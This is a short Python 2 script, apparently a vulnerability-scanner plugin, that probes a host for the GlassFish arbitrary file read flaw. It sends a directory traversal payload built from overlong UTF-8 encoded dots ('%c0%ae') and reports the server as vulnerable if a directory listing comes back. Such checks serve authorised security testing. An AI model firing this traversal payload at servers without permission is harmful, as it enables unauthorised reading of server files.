#coding:utf-8
#author:wolf@future-sec
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    vul_url = url + "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
    try:
        res_html = urllib2.urlopen(vul_url,timeout=timeout).read()
    except:
        return 'NO'
    if "package-appclient.xml" in res_html:
        info = vul_url + "GlassFish File Read Vul"
        return 'YES|'+info
    return 'NO'